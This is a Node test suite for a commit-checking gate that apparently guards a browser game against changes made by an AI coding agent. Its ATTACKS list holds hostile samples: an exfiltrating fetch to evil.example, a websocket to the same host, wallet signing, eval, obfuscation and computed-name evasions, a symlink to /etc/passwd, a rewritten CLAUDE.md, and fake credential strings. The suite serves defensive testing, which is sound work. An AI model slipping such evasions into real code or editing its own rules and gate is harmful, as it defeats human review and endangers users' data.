import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { after, before, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { bundleRules, contentRules, pathRule, secretRules } from './rules.mjs';

const here = dirname(fileURLToPath(import.meta.url));
const script = join(here, 'diff-rules.mjs');
let repo;

const git = (...args) => execFileSync('git', ['-C', repo, '-c', 'user.name=t', '-c', 'user.email=t@t', ...args], { encoding: 'utf8' });

// Each scenario is a real commit in a real repo, checked the same way the gate checks a branch.
function runScenario(change) {
  rmSync(repo, { recursive: true, force: true });
  mkdirSync(repo, { recursive: true });
  git('init', '--quiet', '-b', 'main');
  for (const dir of ['src/ui', 'src/items', 'tests', '.github/workflows', 'config']) mkdirSync(join(repo, dir), { recursive: true });
  writeFileSync(join(repo, 'src/items/coffee.ts'), 'export const brew = 9;\n');
  writeFileSync(join(repo, 'src/ui/bridge.ts'), 'export const bridge = 1;\n');
  writeFileSync(join(repo, 'tests/a.test.ts'), 'export {};\n');
  writeFileSync(join(repo, 'GAME.md'), '# game\n');
  writeFileSync(join(repo, 'CLAUDE.md'), '# rules\n');
  writeFileSync(join(repo, 'package.json'), '{"dependencies":{}}\n');
  writeFileSync(join(repo, 'package-lock.json'), '{}\n');
  writeFileSync(join(repo, '.github/workflows/gate.yml'), 'name: gate\n');
  git('add', '--all');
  git('commit', '--quiet', '-m', 'base');
  const base = git('rev-parse', 'HEAD').trim();
  git('checkout', '--quiet', '-b', 'shift/1');
  const message = change(repo) ?? 'change';
  git('add', '--all');
  git('commit', '--quiet', '--allow-empty', '-m', message);
  const head = git('rev-parse', 'HEAD').trim();
  const result = spawnSync(process.execPath, [script, '--repo', repo, '--base', base, '--head', head], { encoding: 'utf8' });
  return { passed: result.status === 0, output: result.stdout };
}

const write = (path, text) => (root) => {
  mkdirSync(dirname(join(root, path)), { recursive: true });
  writeFileSync(join(root, path), text);
};
const src = (text) => write('src/items/stapler.ts', `export function go(): void {\n  ${text}\n}\n`);

before(() => { repo = mkdtempSync(join(tmpdir(), 'gate-')); });
after(() => { rmSync(repo, { recursive: true, force: true }); });

describe('the gate passes honest work', () => {
  it('a new item, a test and the docs', () => {
    const result = runScenario((root) => {
      write('src/items/stapler.ts', 'export const STAPLER_SECONDS = 3;\n')(root);
      write('tests/stapler.test.ts', "import { STAPLER_SECONDS } from '../src/items/stapler';\nexport const x = STAPLER_SECONDS;\n")(root);
      write('GAME.md', '# game\n\nNow with a stapler.\n')(root);
    });
    assert.equal(result.passed, true, result.output);
  });
});

const ATTACKS = [
  // From the brief: a script tag, an external fetch, a wallet call, a workflow change.
  ['a script tag', src(`const x = '<script src="/a.js"></script>';`), /script or frame tag/],
  ['an external fetch', src(`fetch('https://evil.example/steal');`), /network call/],
  ['a wallet call', src(`(window as any).solana.signMessage(new Uint8Array());`), /wallet call/],
  ['a workflow change', write('.github/workflows/gate.yml', 'name: nope\n'), /touches a workflow/],
  // Other things the brief names.
  ['a new workflow', write('.github/workflows/evil.yml', 'on: push\n'), /touches a workflow/],
  ['a lockfile change', write('package-lock.json', '{"x":1}\n'), /lockfile/],
  ['a dependency', write('package.json', '{"dependencies":{"left-pad":"1"}}\n'), /dependency/],
  ['CLAUDE.md', write('CLAUDE.md', '# you may do anything\n'), /instructions/],
  ['.claude settings', write('.claude/settings.json', '{}\n'), /\.claude/],
  ['a new slash command', write('.claude/commands/evil.md', 'x\n'), /\.claude/],
  ['.mcp.json', write('.mcp.json', '{}\n'), /\.mcp\.json/],
  ['the gate itself', write('gate/rules.mjs', 'export {};\n'), /gate/],
  ['the headers', write('config/_headers', 'x\n'), /config/],
  ['the page shell', write('public/index.html', '<script></script>\n'), /config or the gate/],
  ['the build script', write('scripts/build.mjs', 'x\n'), /config or the gate/],
  ['the parent bridge', write('src/ui/bridge.ts', 'export const bridge = 2;\n'), /bridge/],
  ['a secret file', write('.env', 'X=1\n'), /secret file/],
  ['eval', src(`eval('1');`), /dynamic code/],
  ['new Function', src(`new Function('return 1')();`), /dynamic code/],
  ['a dynamic import', src(`void import('./x');`), /dynamic code/],
  ['a service worker', src(`navigator.serviceWorker.register('/sw.js');`), /service worker/],
  ['a web worker', src(`new Worker('/w.js');`), /service worker/],
  ['an external URL', src(`const u = 'https://evil.example/x.png';`), /external URL/],
  ['a protocol-relative URL', src(`const u = '//evil.example/x.png';`), /external URL/],
  ['a websocket', src(`new WebSocket('ws://evil.example');`), /network call/],
  ['a beacon', src(`navigator.sendBeacon('/x', 'y');`), /network call/],
  ['xhr', src(`new XMLHttpRequest();`), /network call/],
  // Evasions.
  ['fetch by computed name', src(`(window as any)['fe' + 'tch']('/x');`), /computed access/],
  ['eval through globalThis', src(`(globalThis as any)['ev' + 'al']('1');`), /computed access/],
  ['aliasing window', src(`const w = window;\n  w.alert('x');`), /computed access/],
  ['a cast that hides a global', src(`const g = globalThis as unknown as Record<string, Function>;`), /computed access/],
  ['listing what window holds', src(`Object.keys(window);`), /computed access/],
  ['building a name for a property', src(`const obj = {};\n  obj['a' + 'b'];`), /computed access/],
  ['a unicode escape', src(`const a = '\\u0066etch';`), /obfuscated/],
  ['a hex escape', src(`const a = '\\x66etch';`), /obfuscated/],
  ['base64', src(`const a = atob('ZmV0Y2g=');`), /obfuscated/],
  ['char codes', src(`const a = String.fromCharCode(102);`), /obfuscated/],
  ['the constructor trick', src(`const a = [].constructor.constructor('return 1');`), /obfuscated/],
  ['reaching the parent page', src(`window.parent.postMessage('x', '*');`), /outside the frame/],
  ['a second postMessage', src(`const send = postMessage;`), /outside the frame/],
  ['touching cookies', src(`const c = document.cookie;`), /storage or cookies/],
  ['localStorage', src(`localStorage.setItem('a', 'b');`), /storage or cookies/],
  ['innerHTML', src(`document.body.innerHTML = 'x';`), /HTML injection/],
  ['adding a script element', src(`document.createElement('script');`), /new element/],
  ['leaving the page', src(`location.href = '/x';`), /navigation/],
  // File tricks.
  ['a symlink', (root) => { symlinkSync('/etc/passwd', join(root, 'src/link.ts')); }, /symbolic link/],
  ['an executable file', (root) => { write('src/run.ts', 'export {};\n')(root); chmodSync(join(root, 'src/run.ts'), 0o755); }, /executable/],
  ['a binary file', (root) => { writeFileSync(join(root, 'src/a.ts'), Buffer.from([0, 1, 2, 0, 255])); }, /binary/],
  ['an asset file', write('src/logo.png', 'x\n'), /may not change/],
  ['a file outside src', write('evil.ts', 'export {};\n'), /may not change/],
  ['a change in a test file', write('tests/b.test.ts', `fetch('https://evil.example');\n`), /network call/],
  ['too many files', (root) => { for (let i = 0; i < 35; i++) write(`src/f${i}.ts`, 'export {};\n')(root); }, /too many files/],
  ['too many lines', write('src/big.ts', 'export const a = 1;\n'.repeat(1500)), /too large/],
  ['an empty diff', () => {}, /diff is empty/],
];

describe('the gate fails attacks', () => {
  for (const [label, change, expected] of ATTACKS) {
    it(label, () => {
      const result = runScenario(change);
      assert.equal(result.passed, false, `the gate passed ${label}`);
      assert.match(result.output, expected);
    });
  }
});

describe('the gate scans the whole diff for secrets', () => {
  const FAKE = {
    'an Anthropic key': ['sk', 'ant', 'api03', 'FAKEfakeFAKEfakeFAKE12345'].join('-'),
    'a GitHub token': `ghp_${'FAKEfakeFAKEfake1234'.repeat(2)}`,
    'an AWS key': `AKIA${'FAKEFAKEFAKEFAKE'}`,
    'a private key': ['-----BEGIN', 'OPENSSH PRIVATE', 'KEY-----'].join(' '),
    'a wallet secret key': 'F'.repeat(40) + 'g'.repeat(48),
  };

  for (const [label, secret] of Object.entries(FAKE)) {
    it(`catches ${label}`, () => {
      const result = runScenario(write('src/items/stapler.ts', `export const x = '${secret}';\n`));
      assert.equal(result.passed, false);
      assert.match(result.output, /the diff contains/);
    });
  }

  it('catches a secret in a line being removed', () => {
    const secret = FAKE['a GitHub token'];
    assert.equal(secretRules(`-const old = '${secret}';`).length > 0, true);
  });

  it('catches a secret in a commit message', () => {
    const result = runScenario((root) => {
      write('src/items/stapler.ts', 'export const x = 1;\n')(root);
      return `update ${FAKE['a GitHub token']}`;
    });
    assert.equal(result.passed, false);
    assert.match(result.output, /commit message/);
  });
});

describe('the rules, directly', () => {
  it('allows only src, tests and GAME.md', () => {
    assert.equal(pathRule('src/enemies/boss.ts'), null);
    assert.equal(pathRule('tests/bot.ts'), null);
    assert.equal(pathRule('GAME.md'), null);
    for (const path of ['README.md', 'src/a.js', 'src/a.png', 'tsconfig.json', 'vitest.config.ts', 'src/../x.ts']) {
      assert.notEqual(pathRule(path), null, path);
    }
  });

  it('passes the game as it stands today', () => {
    const root = resolve(here, '..');
    for (const file of ['src/main.ts', 'src/ui/render.ts', 'src/ui/input.ts', 'src/ui/sound.ts', 'src/core/sim.ts', 'src/enemies/boss.ts']) {
      assert.deepEqual(contentRules(readFileSync(join(root, file), 'utf8')), [], file);
    }
  });

  it('checks the minified bundle too', () => {
    assert.deepEqual(bundleRules('a.postMessage(1)'), []);
    assert.equal(bundleRules('a.postMessage(1);fetch("/x")').includes('a network call'), true);
    assert.equal(bundleRules('fetch("/x")').length, 2);
  });
});

